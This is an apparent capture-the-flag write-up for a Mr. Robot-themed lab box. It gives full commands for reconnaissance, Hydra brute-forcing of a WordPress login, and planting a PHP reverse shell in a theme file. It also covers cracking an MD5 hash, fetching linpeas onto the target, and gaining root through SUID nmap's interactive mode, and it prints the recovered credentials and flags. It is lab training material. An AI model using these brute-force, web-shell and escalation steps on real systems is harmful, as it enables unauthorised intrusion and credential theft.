because its a robot themed room I went to /robots.txt and immediately found the first key lmao 

User-agent: *
fsocity.dic
key-1-of-3.txt

the key is the first flag and the fsocity.dic is a directory.

┌──(kali㉿kali)-[~]
└─$ curl -k -L https://10.10.8.165/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9


Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 23:45 EDT
Nmap scan report for 10.10.8.165
Host is up (0.096s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.8.165
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.8.165:80/js/BASE_URL1%22/live/%221;this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/js/BASE_URL1%22/live/%221;this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.10.8.165/
|     
|     Path: http://10.10.8.165:80/wp-login.php
|     Form id: loginform
|_    Form action: http://10.10.8.165/wp-login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
443/tcp open   ssl/http Apache httpd
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.8.165
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: https://10.10.8.165:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/js/BASE_URL
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/js/BASE_URL
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: https://10.10.8.165:443/
|     
|     Path: https://10.10.8.165:443/wp-login.php
|     Form id: loginform
|_    Form action: https://10.10.8.165:443/wp-login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache
Device type: general purpose|media device|phone|webcam|storage-misc
Running (JUST GUESSING): Linux 4.X|3.X|2.6.X|5.X (94%), Amazon embedded (88%), Google Android (87%), Synology DiskStation Manager 7.X (87%)
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5.4 cpe:/o:google:android cpe:/o:linux:linux_kernel:4.9 cpe:/a:synology:diskstation_manager:7.1
Aggressive OS guesses: Linux 4.4 (94%), Linux 3.10 - 4.11 (93%), Linux 3.13 - 4.4 (93%), Linux 2.6.32 - 3.13 (91%), Linux 3.2 - 4.14 (90%), Linux 3.8 - 3.16 (90%), Linux 3.13 (89%), Linux 4.15 (89%), Amazon Fire TV (88%), Linux 3.10 - 3.13 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   92.22 ms 10.23.0.1
2   95.52 ms 10.10.8.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 280.89 seconds







┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.8.165 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.8.165
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 234] [--> http://10.10.8.165/images/]
/blog                 (Status: 301) [Size: 232] [--> http://10.10.8.165/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.8.165/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.8.165/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.8.165/0/]
/video                (Status: 301) [Size: 233] [--> http://10.10.8.165/video/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.8.165/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.8.165/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.8.165/feed/atom/]
/wp-content           (Status: 301) [Size: 238] [--> http://10.10.8.165/wp-content/]
/admin                (Status: 301) [Size: 233] [--> http://10.10.8.165/admin/]
/audio                (Status: 301) [Size: 233] [--> http://10.10.8.165/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2657]
/css                  (Status: 301) [Size: 231] [--> http://10.10.8.165/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.8.165/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 239] [--> http://10.10.8.165/wp-includes/]
/js                   (Status: 301) [Size: 230] [--> http://10.10.8.165/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.8.165/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.8.165/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.8.165/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.8.165/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.8.165/]
/wp-admin             (Status: 301) [Size: 236] [--> http://10.10.8.165/wp-admin/]
/phpmyadmin           (Status: 403) [Size: 94]
/0000                 (Status: 301) [Size: 0] [--> http://10.10.8.165/0000/]

unfortunately, wp scan isnt producing an output rn, this means the WP content may be hidden or unexposed or their REST API has JWT security idk I do have a /wp-admin to hydra though when i am finished with enumeration

so the /wp-admin site mentions if the login failure was because of the user or password. Which is good because now I can enumerate usernames. It is also bad because admin and Administrator are not valid credentials.... guess we need to brute force the username. I could use sn1per by burpsuite for this but I need more practice on hydra so I decided to work on writing a hydra command luckily for me it looks like the .dic file i got was a list of usernames

	<input type="text" name="log" id="user_login" aria-describedby="login_error" class="input" value="" size="20"/></label>
	</p>
	<p>
		<label for="user_pass">Password<br/>
		<input type="password" name="pwd" 

my repeater tells me "pwd" is the password parameter and "log" is the username parameter and the page posts "Invalid username" on logon error

 id="login_error">	<strong>ERROR</strong>: Invalid username. < href="http://10.10.8.165/wp-login.php?action=lostpassword">Lost your password?</

┌──(kali㉿kali)-[~]
└─$ hydra -L ~/Downloads/fsocity.dic -p lol 10.10.8.165 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 50
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-13 01:27:35
[DATA] max 50 tasks per 1 server, overall 50 tasks, 858235 login tries (l:858235/p:1), ~17165 tries per task
[DATA] attacking http-post-form://10.10.8.165:80/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username
[80][http-post-form] host: 10.10.8.165   login: Elliot   password: lol


so now we can rockyou Elliot's logon

[ATTEMPT] target 10.10.8.165 - login "Elliot" - pass "525252" - 4800 of 14344399 [child 44] (0/0)
[80][http-post-form] host: 10.10.8.165   login: Elliot
[80][http-post-form] host: 10.10.8.165   login: elliot
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-13 01:40:14


found 525252 as the last password before hydra stopped

┌──(kali㉿kali)-[~]
└─$ hydra -l Elliot -P /usr/share/wordlists/rockyou.txt 10.10.8.165 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -t 50 -V

Basically same command as the last one but changing the u name and P word flags as well as the return message to incorrect

my brute forces kept interrupting so I decided to change my return message to include more text just incase the string "incorrect" could somehow come up in other messages


┌──(kali㉿kali)-[~]
└─$ hydra -l Elliot -P /usr/share/wordlists/rockyou.txt 10.10.8.165 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 50 -V

Hydra was taking forever so I tried lowercase elliot because I couldn't get the capital to snag a password eventually we get elliot:ER28-0652

when i logged in I saw something familiar, twentyX was the theme that was set so I went into the theme editor and used pentest monkey's PHP rev shell code to dump into the 404 directory for the theme http://10.10.46.235/wordpress/wp-content/themes/twentyfifteen/404.php the shell caught

$ ls home
robot
$ ls home/robot
key-2-of-3.txt
password.raw-md5
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
$ 

┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

lol, okay the machine doesn't have SSH, ETC password says robot is the only other user "varnish" on the machine, there is a varnish user with 999 but im not sure if that is a service account, which it is I guess varnish is a content delivery system

┌──(kali㉿kali)-[/]
└─$ sudo curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

┌──(kali㉿kali)-[/]
└─$ python3 -m http.server 4444

$ curl -k -L http://10.23.80.154:4444/linpeas.sh -o /tmp/linpeas3.sh

$ chmod o+x linpeas3.sh

$ bash linpeas3.sh

══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                                     
                      ╚════════════════════════════════════╝                                                                                                                                                                                           
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                                        
strace Not Found                                                                                                                                                                                                                                       
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping                                                                                                                                                                                                      
-rwsr-xr-x 1 root root 68K Feb 12  2015 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 93K Feb 12  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 37K Feb 17  2014 /bin/su
-rwsr-xr-x 1 root root 46K Feb 17  2014 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 32K Feb 17  2014 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 41K Feb 17  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 46K Feb 17  2014 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 67K Feb 17  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 152K Mar 12  2015 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 431K May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9.4K Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14K Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 11K Feb 25  2015 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)

I tried an exploit for sudo https://www.exploit-db.com/exploits/51217 Files with Interesting Permissions, they have the SUID but set as notated by the s


I tried a few different priv esc scripts for versions of software the machine had but didn't have any luck. I can't read the sudoers file and sudo -l but didn't get an output unfortunately.

so my linpeas output didn't show me this but eventually I realized python --version shows an output so I realized I could spawn an interactive shell

$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/tmp$ cd ..

which will NOW allow me to su - robot to login with robot:abcdefghijklmnopqrstuvwxyz

I tried to do sudo and su earlier but it gave me an error for when you run those commands without interactive shells. 

sudo -l 
password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.

well logging in with robot didnt do much so far

https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss_u14.py

welp I tried another sudo privesc script idk im going to gtfobins

The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

```
nmap --interactive
nmap> !sh
```

oh
# nmap --version
nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )


$ nmap --interactive
nmap --interactive

# cd root
cd root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat firstboot_done
cat firstboot_done
# ls firstboot_done
ls firstboot_done
firstboot_done
# ls -la
ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
